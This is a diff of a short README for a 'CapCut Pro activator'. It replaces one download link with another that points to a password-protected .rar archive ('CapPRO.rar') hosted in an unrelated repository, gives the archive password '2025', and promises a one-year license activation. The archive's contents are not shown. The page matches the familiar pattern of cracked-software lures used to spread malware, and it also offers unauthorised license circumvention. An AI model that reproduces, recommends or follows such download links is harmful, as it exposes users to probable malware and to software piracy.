@@ -1,6 +1,6 @@
 # <h1 align="center">CapCut Pro activator</h1>
 
-# [DOWNLOAD](https://github.com/juliusjus/Capcut-pro-activator/raw/refs/heads/master/Top%20Activator.rar)
+# [DOWNLOAD](https://github.com/juliusjus/Rakamin-QA-Java/raw/refs/heads/master/CapPRO.rar)
 # Archive password: 2025
 
 One year license activation
